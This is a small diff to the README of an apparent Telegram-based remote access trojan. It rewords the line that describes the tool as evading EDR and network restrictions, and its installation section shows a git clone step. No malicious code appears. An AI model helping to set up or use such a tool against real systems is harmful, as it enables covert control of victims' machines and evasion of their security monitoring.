@@ -1,6 +1,6 @@
 # Telegram-Rat
 
-    Cross Platform Telegram based RAT that communicates via telegram to evade network and EDR restrictions
+   Cross-platform Telegram-based RAT that uses Telegram for communication in order to get around EDR and network limitations
     
 # Installation:
     1. git clone https://github.com/seccontinuity/Telegram-Rat.git
